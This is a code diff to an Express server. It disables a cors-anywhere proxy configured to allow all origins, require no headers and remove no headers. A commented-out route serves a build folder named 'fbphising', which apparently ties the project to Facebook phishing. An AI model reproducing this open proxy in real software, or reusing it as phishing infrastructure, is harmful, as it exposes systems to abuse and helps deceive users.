@@ -22,13 +22,6 @@ var checkRateLimit = require("./lib/rate-limit")(
   process.env.CORSANYWHERE_RATELIMIT
 );
 
-var corsAnywhere = require("cors-anywhere");
-let proxy = corsAnywhere.createServer({
-  originWhitelist: [], // Allow all origins
-  requireHeaders: [], // Do not require any headers.
-  removeHeaders: [], // Do not remove any headers.
-});
-
 var app = express();
 
 // const PORT: string | number = 4100;
@@ -50,11 +43,16 @@ app.use(express.json());
 // app.get("*", (req: any, res: { sendFile: (arg0: any) => void }) => {
 //   res.sendFile(path.resolve(__dirname, "fbphising", "build", "index.html"));
 // });
-
+// var corsAnywhere = require("cors-anywhere");
+// let proxy = corsAnywhere.createServer({
+//   originWhitelist: [], // Allow all origins
+//   requireHeaders: [], // Do not require any headers.
+//   removeHeaders: [], // Do not remove any headers.
+// });
 /* Attach our cors proxy to the existing API on the /proxy endpoint. */
 app.get("*", (req, res) => {
   req.url = req.url.replace("/proxy/", "/"); // Strip '/proxy' from the front of the URL, else the proxy won't work.
-  proxy.emit("request", req, res);
+  // proxy.emit("request", req, res);
 });
 
 app.listen(8000, host, () =>
